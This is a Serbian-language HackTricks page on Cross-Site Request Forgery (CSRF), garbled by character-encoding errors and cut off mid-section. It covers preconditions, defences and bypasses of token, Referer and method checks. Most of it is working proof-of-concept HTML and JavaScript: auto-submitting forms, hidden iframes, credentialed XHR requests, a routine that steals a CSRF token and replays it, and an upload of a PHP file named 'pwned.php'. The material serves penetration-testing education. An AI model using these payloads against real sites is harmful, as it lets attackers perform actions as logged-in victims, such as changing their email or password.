# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja putem vesti i saznanja u realnom vremenu

**Najnovije objave**\
Ostanite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!


## CSRF (Cross-Site Request Forgery) objaÅ¡njenje

**Cross-Site Request Forgery (CSRF)** je vrsta sigurnosne ranjivosti koja se nalazi u veb aplikacijama. OmoguÄ‡ava napadaÄima da izvrÅ¡e radnje u ime nesumnjivih korisnika iskoriÅ¡Ä‡avanjem njihovih autentifikovanih sesija. Napad se izvrÅ¡ava kada korisnik, koji je prijavljen na platformu Å¾rtve, poseti zlonamernu stranicu. Ova stranica zatim pokreÄ‡e zahteve ka nalogu Å¾rtve putem metoda kao Å¡to su izvrÅ¡avanje JavaScript-a, slanje formi ili dohvatanje slika.

### Preduslovi za CSRF napad
Da bi se iskoristila CSRF ranjivost, moraju se ispuniti nekoliko uslova:

1. **Identifikacija vredne radnje**: NapadaÄ mora pronaÄ‡i radnju koju vredi iskoristiti, kao Å¡to je promena korisniÄke lozinke, e-poÅ¡te ili poveÄ‡anje privilegija.
2. **Upravljanje sesijom**: KorisniÄka sesija treba da se upravlja iskljuÄivo putem kolaÄiÄ‡a ili zaglavlja HTTP Basic Authentication, jer se druga zaglavlja ne mogu manipulisati u tu svrhu.
3. **Odsustvo nepredvidivih parametara**: Zahtev ne sme da sadrÅ¾i nepredvidive parametre, jer oni mogu spreÄiti napad.

### Odbrana od CSRF napada
Mogu se primeniti nekoliko protivmera kako bi se zaÅ¡titili od CSRF napada:

* [**SameSite kolaÄiÄ‡i**](hacking-with-cookies/#samesite): Ova atribut spreÄava pregledaÄ da Å¡alje kolaÄiÄ‡e zajedno sa zahtevima sa drugih sajtova. [ViÅ¡e o SameSite kolaÄiÄ‡ima](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): CORS politika Å¾rtvinskog sajta moÅ¾e uticati na izvodljivost napada, posebno ako napad zahteva Äitanje odgovora sa Å¾rtvinskog sajta. [Saznajte viÅ¡e o zaobilaÅ¾enju CORS-a](cors-bypass.md).
* **Provera korisnika**: Zahtevanje korisniÄke lozinke ili reÅ¡avanje captcha testa moÅ¾e potvrditi nameru korisnika.
* **Provera Referrer ili Origin zaglavlja**: Validacija ovih zaglavlja moÅ¾e pomoÄ‡i u osiguravanju da zahtevi dolaze sa pouzdanih izvora. MeÄ‘utim, paÅ¾ljivo kreiranje URL-ova moÅ¾e zaobiÄ‡i loÅ¡e implementirane provere, kao Å¡to su:
- KoriÅ¡Ä‡enje `http://mal.net?orig=http://example.com` (URL se zavrÅ¡ava sa pouzdanim URL-om)
- KoriÅ¡Ä‡enje `http://example.com.mal.net` (URL poÄinje sa pouzdanim URL-om)
* **Izmena imena parametara**: Izmena imena parametara u POST ili GET zahtevima moÅ¾e pomoÄ‡i u spreÄavanju automatizovanih napada.
* **CSRF tokeni**: UkljuÄivanje jedinstvenog CSRF tokena u svaku sesiju i zahtevanje ovog tokena u kasnijim zahtevima moÅ¾e znaÄajno umanjiti rizik od CSRF napada. Efikasnost tokena se moÅ¾e poboljÅ¡ati primenom CORS-a.

Razumevanje i primena ovih odbrana je kljuÄno za odrÅ¾avanje sigurnosti i integriteta veb aplikacija.

## ZaobilaÅ¾enje odbrana

### Od POST do GET

MoÅ¾da je obrazac koji Å¾elite da zloupotrebite pripremljen za slanje **POST zahteva sa CSRF tokenom**, ali trebali biste **proveriti** da li je i **GET** zahtev **validan** i da li se prilikom slanja GET zahteva **CSRF token i dalje validira**.

### Nedostatak tokena

Aplikacije mogu implementirati mehanizam za **validaciju tokena** kada su prisutni. MeÄ‘utim, ranjivost se javlja ako se validacija potpuno preskoÄi kada token nije prisutan. NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e **ukloniti parametar** koji nosi token, ne samo njegovu vrednost. To im omoguÄ‡ava da zaobiÄ‘u proces validacije i uspeÅ¡no izvrÅ¡e CSRF napad.

### CSRF token nije vezan za korisniÄku sesiju

Aplikacije koje **ne veÅ¾u CSRF tokene za korisniÄke sesije** predstavljaju znaÄajan **sigurnosni rizik**. Ovi sistemi proveravaju tokene protiv **globalnog skupa** umesto da osiguravaju da je svaki token vezan za inicijalnu sesiju.

Evo kako napadaÄi iskoriÅ¡Ä‡avaju ovo:

1. **Autentifikacija** koristeÄ‡i sopstveni nalog.
2. **Dobijanje validnog CSRF tokena** iz globalnog skupa.
3. **KoriÅ¡Ä‡enje ovog tokena** u CSRF napadu protiv Å¾rtve.

Ova ranjivost omoguÄ‡ava napadaÄima da izvrÅ¡e neovlaÅ¡tene zahteve u ime Å¾rtve, iskoriÅ¡Ä‡avajuÄ‡i neadekvatan mehanizam validacije tokena aplikacije.

### ZaobilaÅ¾enje metoda

Ako zahtev koristi "**Äudnu**" **metodu**, proverite da li funkcionalnost **zamene metoda** radi.
Na primer, ako se koristi **PUT** metoda, moÅ¾ete pokuÅ¡ati da koristite **POST** metodu i **poÅ¡aljete**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Ovo takoÄ‘e moÅ¾e raditi slanjem **\_method parametra unutar POST zahteva** ili koriÅ¡Ä‡enjem **zaglavlja**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### ZaobilaÅ¾enje prilagoÄ‘enog zaglavlja tokena

Ako zahtev dodaje **prilagoÄ‘eno zaglavlje** sa **tokenom** kao **metodom zaÅ¡tite od CSRF-a**, tada:

* Testirajte zahtev bez **pril
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Imajte na umu da ako je **CSRF token povezan sa sesijskim kolaÄiÄ‡em, ovaj napad neÄ‡e uspeti** jer Ä‡e vam biti potrebno da Å¾rtvi postavite svoju sesiju, a time Ä‡ete napadati sebe.
{% endhint %}

### Promena Content-Type-a

Prema [**ovome**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), kako biste **izbegli preflight** zahteve koristeÄ‡i **POST** metodu, ovo su dozvoljene vrednosti Content-Type-a:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

MeÄ‘utim, imajte na umu da **logika servera moÅ¾e varirati** u zavisnosti od koriÅ¡Ä‡enog Content-Type-a, pa biste trebali isprobati navedene vrednosti i druge poput **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Primer (preuzet [ovde](https://brycec.me/posts/corctf\_2021\_challenges)) slanja JSON podataka kao text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Zaobilazak preflight zahteva za JSON podatke

Kada pokuÅ¡avate da poÅ¡aljete JSON podatke putem POST zahteva, direktno koriÅ¡Ä‡enje `Content-Type: application/json` u HTML formi nije moguÄ‡e. SliÄno, koriÅ¡Ä‡enje `XMLHttpRequest` za slanje ovog tipa sadrÅ¾aja pokreÄ‡e preflight zahtev. Ipak, postoje strategije koje potencijalno omoguÄ‡avaju zaobilaÅ¾enje ove ograniÄenosti i proveru da li server obraÄ‘uje JSON podatke bez obzira na Content-Type:

1. **KoriÅ¡Ä‡enje alternativnih Content-Type-ova**: Koristite `Content-Type: text/plain` ili `Content-Type: application/x-www-form-urlencoded` tako Å¡to Ä‡ete postaviti `enctype="text/plain"` u formi. Ovaj pristup testira da li backend koristi podatke bez obzira na Content-Type.

2. **Izmena Content Type-a**: Da biste izbegli preflight zahtev, a istovremeno obezbedili da server prepozna sadrÅ¾aj kao JSON, moÅ¾ete poslati podatke sa `Content-Type: text/plain; application/json`. Ovo ne pokreÄ‡e preflight zahtev, ali server moÅ¾e pravilno obraditi podatke ako je konfigurisan da prihvata `application/json`.

3. **KoriÅ¡Ä‡enje SWF Flash fajla**: Manje uobiÄajena, ali izvodljiva metoda ukljuÄuje koriÅ¡Ä‡enje SWF Flash fajla za zaobilaÅ¾enje ovih ograniÄenja. Za detaljnije razumevanje ove tehnike, pogledajte [ovaj post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### ZaobilaÅ¾enje provere Referrer / Origin

**Izbegavanje Referrer zaglavlja**

Aplikacije mogu validirati 'Referer' zaglavlje samo kada je prisutno. Da biste spreÄili pregledaÄ da poÅ¡alje ovo zaglavlje, moÅ¾ete koristiti sledeÄ‡i HTML meta tag:
```xml
<meta name="referrer" content="never">
```
Ovo osigurava da se zaglavlje 'Referer' izostavi, potencijalno zaobilazeÄ‡i provjere valjanosti u nekim aplikacijama.

**Bypass Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Da biste postavili ime domene servera u URL-u koji Ä‡e Referrer poslati unutar parametara, moÅ¾ete uraditi:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Bypass metoda HEAD**

Prvi deo [**ovog CTF writeup-a**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) objaÅ¡njava da [izvorni kod Oak-a](https://github.com/oakserver/oak/blob/main/router.ts#L281), rutera je postavljen da **obradi HEAD zahteve kao GET zahteve** bez tela odgovora - uobiÄajeni naÄin rada koji nije jedinstven za Oak. Umesto posebnog rukovaoca koji se bavi HEAD zahtevima, oni jednostavno **bivaju prosleÄ‘eni GET rukovaocu, ali aplikacija samo uklanja telo odgovora**.

Dakle, ako je GET zahtev ograniÄen, moÅ¾ete jednostavno **poslati HEAD zahtev koji Ä‡e biti obraÄ‘en kao GET zahtev**.

## **Primeri eksploatacije**

### **IzvlaÄenje CSRF tokena**

Ako se koristi **CSRF token** kao **odbrana**, moÅ¾ete pokuÅ¡ati da ga **izvuÄete** zloupotrebom [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ranjivosti ili ranjivosti [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET koriÅ¡Ä‡enjem HTML tagova**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Drugi HTML5 tagovi koji se mogu koristiti za automatsko slanje GET zahteva su:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### GET zahtev preko forme

Kada se koristi HTML forma za slanje podataka na server, obiÄno se koristi metoda GET ili POST. GET metoda se koristi za slanje podataka preko URL-a, dok se POST metoda koristi za slanje podataka u telu HTTP zahteva.

CSRF napad moÅ¾e iskoristiti GET zahtev preko forme tako Å¡to Ä‡e napadaÄ kreirati laÅ¾nu formu koja Ä‡e izgledati kao legitimna forma na ciljanoj veb stranici. Kada Å¾rtva popuni formu i poÅ¡alje je, podaci Ä‡e biti poslati na server, ali Ä‡e takoÄ‘e biti izvrÅ¡en i CSRF napad.

Da bi se izvrÅ¡io CSRF napad preko GET zahteva, napadaÄ Ä‡e kreirati URL koji sadrÅ¾i parametre sa vrednostima koje Å¾eli da poÅ¡alje na server. Ovaj URL Ä‡e biti smeÅ¡ten u laÅ¾nu formu koja Ä‡e biti automatski poslata kada Å¾rtva poseti ciljanu veb stranicu.

Da bi se zaÅ¡titili od CSRF napada preko GET zahteva, preporuÄuje se koriÅ¡Ä‡enje POST metode za slanje podataka preko forme. TakoÄ‘e, implementacija CSRF tokena moÅ¾e dodatno oteÅ¾ati napadaÄima da izvrÅ¡e ovu vrstu napada.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST zahtev

Form POST zahtev je HTTP zahtev koji se koristi za slanje podataka sa klijenta na server putem HTML forme. Ovaj zahtev se koristi za slanje podataka kao Å¡to su korisniÄko ime i lozinka prilikom prijavljivanja na veb stranicu.

Da biste izvrÅ¡ili CSRF napad putem form POST zahteva, napadaÄ Ä‡e kreirati laÅ¾nu veb stranicu koja sadrÅ¾i formu sa ciljanim ciljem. Kada Å¾rtva poseti ovu laÅ¾nu stranicu i popuni formu, podaci Ä‡e biti automatski poslati na ciljni server. Ovaj napad se obiÄno izvodi koriÅ¡Ä‡enjem skripti na strani napadaÄa, kao Å¡to je JavaScript.

Da biste se zaÅ¡titili od CSRF napada putem form POST zahteva, moÅ¾ete koristiti razliÄite metode, kao Å¡to su:

- KoriÅ¡Ä‡enje CSRF tokena: Dodavanje jedinstvenog tokena u formu koji se generiÅ¡e prilikom svakog zahteva. Ovaj token se zatim proverava na serveru kako bi se osiguralo da je zahtev legitimno poslat od strane korisnika.
- Provera referera: Provera HTTP referera kako bi se osiguralo da je zahtev poslat sa iste veb stranice sa koje je korisnik prijavljen.
- KoriÅ¡Ä‡enje SameSite atributa: Postavljanje SameSite atributa na "Strict" ili "Lax" kako bi se ograniÄilo slanje kolaÄiÄ‡a sa zahtevima sa drugih domena.

Implementacija ovih mera zaÅ¡tite moÅ¾e pomoÄ‡i u spreÄavanju CSRF napada putem form POST zahteva i oÄuvanju sigurnosti vaÅ¡e veb aplikacije.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Form POST zahtev putem iframe-a

Kada Å¾elite da izvrÅ¡ite CSRF napad putem iframe-a, moÅ¾ete koristiti sledeÄ‡i metod:

1. Kreirajte HTML stranicu koja sadrÅ¾i `<form>` element sa odgovarajuÄ‡im atributima, kao Å¡to su `action` (ciljni URL) i `method` (POST).
2. Postavite vrednosti polja forme na Å¾eljene vrednosti, ukljuÄujuÄ‡i i CSRF token ako je potreban.
3. Ubacite `<iframe>` element u HTML stranicu i postavite `src` atribut na ciljni URL.
4. Koristite CSS da sakrijete iframe tako da korisnik ne primeti njegovo prisustvo.

Kada Å¾rtva poseti HTML stranicu, form POST zahtev Ä‡e biti automatski izvrÅ¡en putem iframe-a, bez da korisnik primeti. Ovo omoguÄ‡ava napadaÄu da izvrÅ¡i zlonamerne radnje u ime Å¾rtve, kao Å¡to je slanje laÅ¾nih zahteva ili izvrÅ¡avanje akcija koje zahtevaju autentifikaciju.

VaÅ¾no je napomenuti da ovaj metod moÅ¾e biti blokiran od strane modernih pregledaÄa zbog sigurnosnih razloga. TakoÄ‘e, ciljni sajt moÅ¾e preduzeti mere zaÅ¡tite protiv CSRF napada, kao Å¡to je koriÅ¡Ä‡enje CSRF tokena ili provera referera.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST zahtev**

Ajax POST zahtev je tehnika koja se koristi za slanje HTTP POST zahteva asinhrono, bez potrebe za osveÅ¾avanjem celokupne stranice. Ova tehnika se Äesto koristi u veb aplikacijama radi slanja podataka na server i aÅ¾uriranja sadrÅ¾aja stranice bez prekida korisniÄkog iskustva.

Da biste izvrÅ¡ili CSRF napad putem Ajax POST zahteva, napadaÄ bi trebao da ubaci zlonamerni kod u legitimnu veb stranicu koju korisnik poseÄ‡uje. Kada korisnik poseti tu stranicu, zlonamerni kod Ä‡e automatski izvrÅ¡iti POST zahtev na drugu veb stranicu, koristeÄ‡i autentiÄnost korisnika na prvoj stranici. Ovo moÅ¾e dovesti do neovlaÅ¡Ä‡enog izvrÅ¡avanja akcija na drugoj stranici, kao Å¡to je promena lozinke ili brisanje podataka.

Da biste se zaÅ¡titili od CSRF napada putem Ajax POST zahteva, preporuÄuje se koriÅ¡Ä‡enje CSRF tokena. CSRF token je jedinstveni identifikator koji se generiÅ¡e za svaku sesiju i ugraÄ‘uje u svaki POST zahtev. Server zatim proverava da li se token podudara sa tokenom koji je generisan za tu sesiju, Äime se osigurava da je zahtev legitimno poslat od strane korisnika.

Ukoliko veb aplikacija ne koristi CSRF token, napadaÄ moÅ¾e iskoristiti ovu ranjivost za izvrÅ¡avanje zlonamernih radnji na raÄunu korisnika. Stoga je vaÅ¾no da programeri implementiraju odgovarajuÄ‡e mere zaÅ¡tite kako bi spreÄili CSRF napade putem Ajax POST zahteva.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST zahtev

Multipart/form-data POST zahtev se koristi za slanje podataka preko HTTP protokola. Ovaj tip zahteva se Äesto koristi za slanje datoteka ili formulara koji sadrÅ¾e razliÄite vrste podataka.

Da biste napravili multipart/form-data POST zahtev, morate koristiti odgovarajuÄ‡i Content-Type zaglavlje i formatirati telo zahteva u skladu sa specifikacijom.

Evo primera kako izgleda multipart/form-data POST zahtev:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

Ovo je primer datoteke.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

U ovom primeru, zaglavlje Content-Type specificira da je format podataka multipart/form-data, a boundary parametar definiÅ¡e razgraniÄivaÄ izmeÄ‘u razliÄitih delova podataka.

Svaki deo podataka je definisan sa Content-Disposition zaglavljem, koje specificira da li je deo datoteka ili polje forme. TakoÄ‘e, moÅ¾e sadrÅ¾ati dodatne informacije kao Å¡to su ime polja ili ime datoteke.

Nakon zaglavlja, sledi telo podataka koje je odvojeno od ostatka zahteva razgraniÄivaÄem. Svaki deo podataka je odvojen sa razgraniÄivaÄem i moÅ¾e sadrÅ¾ati razliÄite vrste podataka.

Kada se multipart/form-data POST zahtev poÅ¡alje na server, server moÅ¾e obraditi podatke u skladu sa specifikacijom i izvrÅ¡iti odgovarajuÄ‡e akcije, kao Å¡to je Äuvanje datoteke ili obrada formulara.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST zahtev v2

Multipart/form-data POST zahtev se koristi za slanje podataka preko HTTP protokola. Ovaj tip zahteva se Äesto koristi za slanje datoteka ili formulara koji sadrÅ¾e razliÄite vrste podataka.

Da biste izvrÅ¡ili CSRF napad na multipart/form-data POST zahtev, potrebno je da Å¾rtva bude prijavljena na ciljnu veb aplikaciju. NapadaÄ moÅ¾e da konstruiÅ¡e zlonamerni HTML kod koji Ä‡e automatski izvrÅ¡iti zahtev kada Å¾rtva poseti zlonamernu veb stranicu.

Da biste izvrÅ¡ili CSRF napad, napadaÄ mora da konstruiÅ¡e HTML formular koji Ä‡e sadrÅ¾ati ciljni multipart/form-data POST zahtev. Formular Ä‡e biti automatski podnet kada Å¾rtva poseti zlonamernu veb stranicu.

NapadaÄ moÅ¾e da koristi sledeÄ‡e metode za izvrÅ¡avanje CSRF napada na multipart/form-data POST zahtev:

1. Skriveni iframe: NapadaÄ moÅ¾e da koristi skriveni iframe da bi automatski izvrÅ¡io multipart/form-data POST zahtev kada Å¾rtva poseti zlonamernu veb stranicu. Ovo se postiÅ¾e postavljanjem ciljnog zahteva kao ciljne veb stranice u iframe elementu.

2. JavaScript: NapadaÄ moÅ¾e da koristi JavaScript kod da bi automatski izvrÅ¡io multipart/form-data POST zahtev kada Å¾rtva poseti zlonamernu veb stranicu. Ovo se postiÅ¾e koriÅ¡Ä‡enjem XMLHttpRequest objekta ili Fetch API-ja za slanje zahteva.

Da biste se zaÅ¡titili od CSRF napada na multipart/form-data POST zahtev, preporuÄuje se koriÅ¡Ä‡enje CSRF tokena. CSRF token je jedinstveni identifikator koji se generiÅ¡e za svaku sesiju i ugraÄ‘uje se u multipart/form-data POST zahtev. Prilikom obrade zahteva, veb aplikacija proverava da li se CSRF token podudara sa oÄekivanim vrednostima. Ako se token ne podudara, zahtev se odbacuje.

TakoÄ‘e je vaÅ¾no da veb aplikacija implementira odgovarajuÄ‡e sigurnosne mehanizme kako bi spreÄila izvrÅ¡avanje zlonamernih zahteva. Ovo moÅ¾e ukljuÄivati proveru referera, proveru korisniÄkih prava i implementaciju sigurnosnih politika za zaÅ¡titu od CSRF napada.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Form POST zahtev iz okvira (iframe)

Kada se radi o napadima CSRF (Cross-Site Request Forgery), jedna od tehnika koja se moÅ¾e koristiti je slanje form POST zahteva iz okvira (iframe). Ova tehnika omoguÄ‡ava napadaÄu da izvrÅ¡i neovlaÅ¡Ä‡ene radnje u ime Å¾rtve.

Da bi se izvrÅ¡io ovaj napad, napadaÄ Ä‡e prvo kreirati HTML stranicu koja sadrÅ¾i formu sa ciljanim akcijama. Zatim Ä‡e tu stranicu ugraditi u iframe na svojoj zlonamernoj veb stranici. Kada Å¾rtva poseti zlonamernu stranicu, form POST zahtev Ä‡e biti automatski poslat sa podacima koje je napadaÄ unapred postavio.

Ova tehnika je posebno opasna jer se zahtevi Å¡alju sa legitimnim kredencijalima Å¾rtve, Å¡to moÅ¾e dovesti do izvrÅ¡avanja neovlaÅ¡Ä‡enih radnji u ime Å¾rtve, kao Å¡to su promena lozinke, brisanje podataka ili izvrÅ¡avanje finansijskih transakcija.

Da bi se zaÅ¡titili od ovog napada, veb aplikacije treba da primene odgovarajuÄ‡e mere zaÅ¡tite, kao Å¡to su koriÅ¡Ä‡enje CSRF tokena, provera referera ili implementacija dvofaktorne autentifikacije.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev**

Da biste izvrÅ¡ili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Ovaj token se obiÄno nalazi u HTML formi ili u zaglavlju zahteva. Nakon Å¡to ste dobili token, moÅ¾ete ga koristiti da biste poslali laÅ¾ni POST zahtev na ciljanu veb stranicu.

Evo koraka za izvrÅ¡avanje ovog napada:

1. Prikupite CSRF token sa ciljane veb stranice. MoÅ¾ete to uraditi pregledanjem izvornog koda stranice ili koriÅ¡Ä‡enjem alata za ispitivanje saobraÄ‡aja poput Burp Suite.

2. Napravite laÅ¾ni POST zahtev koristeÄ‡i ukradeni CSRF token. Ovaj zahtev moÅ¾e sadrÅ¾ati bilo kakve podatke koje Å¾elite da poÅ¡aljete na ciljanu veb stranicu.

3. PoÅ¡aljite laÅ¾ni POST zahtev na ciljanu veb stranicu. MoÅ¾ete koristiti alate poput cURL ili Postman za slanje zahteva.

4. Ako je napad uspeÅ¡an, ciljana veb stranica Ä‡e obraditi laÅ¾ni zahtev kao da je legitimni zahtev poslat od strane autentiÄnog korisnika.

Napomena: CSRF napadi su neetiÄki i ilegalni, osim ako se izvode u okviru zakonitog ispitivanja ranjivosti ili sa dozvolom vlasnika ciljane veb stranice. Uvek se pridrÅ¾avajte zakona i etiÄkih smernica prilikom izvoÄ‘enja bilo kakvih hakovanja ili ispitivanja ranjivosti.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev koristeÄ‡i iframe, formu i Ajax**

Da biste izvrÅ¡ili CSRF napad, prvo morate da ukradete CSRF token sa ciljane veb stranice. Postoje tri metode koje moÅ¾ete koristiti za to: iframe, forma i Ajax.

#### **Iframe metoda**

1. Kreirajte iframe element u HTML kodu koji Ä‡e prikazivati ciljanu veb stranicu.
2. Koristite JavaScript da pristupite CSRF tokenu unutar iframe-a.
3. PoÅ¡aljite POST zahtev koristeÄ‡i ukradeni CSRF token.

#### **Forma metoda**

